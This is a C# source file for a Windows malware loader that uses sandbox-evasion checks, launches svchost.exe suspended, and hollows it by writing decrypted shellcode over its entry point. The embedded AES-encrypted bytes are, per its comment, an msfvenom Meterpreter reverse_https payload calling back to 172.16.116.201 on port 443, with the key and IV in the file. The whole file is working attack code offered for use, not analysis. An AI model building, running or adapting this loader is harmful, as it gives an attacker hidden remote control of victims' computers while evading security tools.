using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace App32
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        public static void Main(string[] args)
        {
            Run();
        }

        public static void Run()
        {
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                return;
            }

            var rand = new Random();
            uint dream = (uint)rand.Next(10000, 20000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                Console.WriteLine("The moment of realization is the moment when you see things clearly and know exactly what you need to do.");
                return;
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.116.201 LPORT=443 -f csharp --encrypt aes256 --encrypt-key 7cd4b463ab1f1af0cd4e55b016e14f44 --encrypt-iv 6f9d1b909131c1aa
            byte[] buf = new byte[736] {0xd9,0xfe,0x74,0x3a,0xc0,0x3a,
0x80,0xfd,0x15,0xba,0xe5,0xf6,0xba,0x1d,0xf9,0xc5,0xf2,0xea,
0xe0,0x99,0x69,0xe9,0xd3,0x43,0xc2,0x31,0x98,0xd3,0x27,0x05,
0x05,0xbc,0x7c,0x0d,0x51,0x9a,0x00,0x24,0x73,0x2f,0xae,0x9b,
0xc7,0x18,0x6f,0xdc,0x49,0xd3,0x95,0xd4,0xef,0x11,0x49,0x5f,
0x1d,0xa4,0x3f,0x74,0xb8,0xd4,0x2f,0x21,0xee,0xff,0xe8,0xde,
0x00,0x86,0x9c,0x3f,0x07,0xc1,0x9d,0x70,0xb3,0xc0,0x4f,0x59,
0x35,0x9a,0x77,0xce,0x46,0xbc,0x12,0xee,0x4a,0x53,0xfd,0x4e,
0x99,0xf7,0x05,0xb8,0x4c,0x91,0x12,0xeb,0xf6,0x65,0x4f,0x38,
0xea,0x9f,0x57,0x15,0x0d,0x78,0x28,0xcf,0xaf,0x7a,0x0d,0x7b,
0x7a,0x98,0x0e,0x72,0x64,0x7c,0xb4,0x34,0x4a,0x5f,0x5c,0xf6,
0x4e,0xba,0xb6,0x22,0x9b,0xee,0x6d,0x27,0x72,0x4b,0x9c,0xf7,
0x30,0xb0,0x4f,0x1f,0x81,0xce,0x74,0xa5,0x9f,0xec,0x9e,0x3a,
0xc7,0x7b,0xa4,0x84,0xa0,0xa2,0x65,0xb4,0xc8,0x9d,0xdf,0x6d,
0x94,0xb5,0x14,0x46,0xe7,0xac,0x3b,0x2c,0xed,0x2e,0xf3,0x8e,
0x8c,0x64,0xa4,0xa1,0x29,0x17,0x3e,0x66,0x82,0x1a,0x40,0x96,
0x14,0x66,0x8e,0xda,0xbc,0x82,0x65,0xcb,0x96,0x4e,0x8e,0xbb,
0xa5,0x32,0xa6,0x4a,0x13,0xf9,0xef,0x1f,0x3b,0xf5,0x9a,0x0c,
0x8e,0xef,0x32,0x8b,0xfe,0x36,0x3b,0x2a,0xdd,0x1b,0xff,0x40,
0x32,0x38,0x4d,0x0f,0x42,0xd1,0x7f,0x7a,0x4c,0xeb,0x96,0xd6,
0xb6,0x4b,0x6a,0xdf,0xcf,0x52,0xbc,0xe2,0xd0,0x74,0xf6,0x5b,
0x51,0xe5,0x32,0xa2,0x79,0x8c,0x53,0x64,0xa2,0x47,0xc5,0x0f,
0xfe,0xf7,0x2f,0xf8,0x2b,0x8b,0x43,0xb0,0x42,0x5f,0x27,0x10,
0x8a,0xee,0xe9,0x3e,0x2e,0xab,0x13,0xf3,0xea,0xe7,0xcc,0x3c,
0x5c,0x4c,0x3e,0xf0,0xb8,0x32,0x62,0x25,0xe8,0xb6,0xf1,0x7d,
0x85,0x90,0x33,0x99,0x37,0x9e,0xaa,0x6b,0xf2,0x90,0x9a,0xd6,
0x85,0x8e,0x6b,0xcd,0x7f,0x37,0x45,0xb9,0x7f,0xde,0xca,0xd7,
0xa0,0xd9,0x20,0x09,0x9c,0x99,0x81,0x18,0x9d,0xda,0x90,0xcb,
0x1d,0x8a,0x77,0x3a,0xbe,0xc9,0xbc,0x30,0x25,0x8d,0x0b,0xcc,
0x32,0x01,0xf4,0xfd,0x7d,0xea,0x2a,0x07,0x6d,0x48,0xb8,0xe9,
0xa4,0xe8,0xb4,0x11,0x08,0xbc,0x00,0x27,0x03,0xa0,0xd5,0x83,
0x61,0x72,0xa0,0x87,0xeb,0x50,0x89,0xf6,0x59,0xd5,0x37,0xc0,
0x6e,0x4b,0xbd,0x21,0xbf,0x38,0x04,0x5e,0xf3,0x45,0x37,0x66,
0xe6,0x1b,0x70,0xc7,0x32,0x06,0x54,0xd6,0xa3,0x3d,0xd2,0xa8,
0x03,0xfe,0x95,0xa6,0xb8,0xad,0x36,0x87,0xc9,0x8c,0x94,0x45,
0xa0,0x4d,0x6f,0x49,0x8d,0xe8,0xe7,0x6d,0xc4,0x57,0x97,0xbd,
0xe0,0x3f,0xcd,0x7f,0x26,0x2a,0x40,0xea,0xba,0x5c,0x5a,0x80,
0x63,0x09,0xe9,0x2a,0xf6,0xe3,0x80,0x1b,0x1a,0x16,0xda,0x00,
0xcc,0x37,0x7d,0x75,0x49,0x13,0x95,0xb0,0xe8,0x74,0x89,0xdc,
0x53,0x90,0x88,0x1e,0xf6,0x99,0x39,0x1e,0xf9,0x87,0x1d,0x45,
0x6b,0x99,0xf4,0xfb,0x28,0xe2,0xf3,0x1d,0x51,0x3f,0xc7,0x81,
0x27,0x89,0xdf,0xd3,0x26,0x45,0x64,0x2f,0x75,0xd0,0x7b,0x72,
0xef,0x07,0xac,0x0d,0xc9,0xaf,0x67,0x4d,0xf7,0x99,0xcd,0x6f,
0x0f,0xe0,0xfe,0x21,0xda,0x67,0x83,0x03,0xa6,0xde,0x84,0x2b,
0x71,0xc0,0x48,0x14,0x2b,0x89,0x68,0x52,0xda,0x11,0x61,0x32,
0x70,0x2e,0x80,0x9d,0x78,0x62,0x6c,0x0b,0xa0,0x0c,0x3c,0x56,
0x2a,0xd6,0xb4,0x3a,0x1e,0xbc,0x76,0xf7,0x04,0xb1,0xe8,0x61,
0x23,0xc9,0xf7,0x6a,0x94,0x59,0x5e,0x01,0xfe,0x9e,0xd0,0x44,
0x02,0xed,0x5f,0x01,0x1f,0x34,0x0a,0x27,0x28,0x0d,0x9f,0x0b,
0x47,0xf3,0xdb,0xf0,0xa2,0x30,0x7f,0x19,0x57,0xc0,0x0e,0xcb,
0x6a,0x6a,0x7d,0xc7,0x6d,0xc7,0xa3,0x9f,0xd8,0xd1,0x99,0x6f,
0xeb,0x3c,0xd3,0x15,0xc7,0xb4,0x60,0xb6,0x74,0x34,0x9a,0x6b,
0xa2,0x1a,0x65,0x1c,0xf3,0x49,0x6e,0xae,0x62,0x5a,0x8d,0xba,
0xf0,0x14,0x16,0x4a,0x6e,0xb4,0x2d,0x87,0x02,0xa2,0x93,0x44,
0x97,0x3d,0xc6,0xa4,0x0d,0x88,0xe1,0x71,0x50,0x85,0x3e,0xce,
0x6e,0x6e,0x5e,0xf6,0x97,0x04,0x4e,0xf5,0x7e,0xb0,0xb8,0x70,
0x05,0xd5,0x77,0x35,0xd5,0x67,0x18,0x91,0x33,0xc7,0xff,0x6b,
0xe8,0x28,0xca,0x0b,0xf9,0xb0,0x00,0xc3,0xef,0xf9,0x9c,0xfd,
0xdd,0xb0,0xdc,0x7b,0x22,0xb0,0x9a,0x76,0x11,0x6a,0x86,0x9a,
0x34,0x90,0xdf,0x73,0x7d,0x60,0x5f,0x81,0x99,0x7e,0xf8,0x6a,
0xc9,0x13,0xaf,0x5a,0x3d,0x2b,0x2c,0xaf,0x0e,0x16,0x4b,0x2f,
0xd3,0x26,0xd6,0xa4,0x9e,0x5f,0xb8,0xed,0x1f,0x78};


            byte[] key = Encoding.ASCII.GetBytes("7cd4b463ab1f1af0cd4e55b016e14f44");
            byte[] iv = Encoding.ASCII.GetBytes("6f9d1b909131c1aa");

            using (var aes = AesCryptoServiceProvider.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                ICryptoTransform decryptor = aes.CreateDecryptor();

                byte[] DecSCode = decryptor.TransformFinalBlock(buf, 0, buf.Length);

                int size = DecSCode.Length;

                WriteProcessMemory(hProcess, addressOfEntryPoint, DecSCode, buf.Length, out nRead);
                ResumeThread(pi.hThread);
            }
        }
    }
}
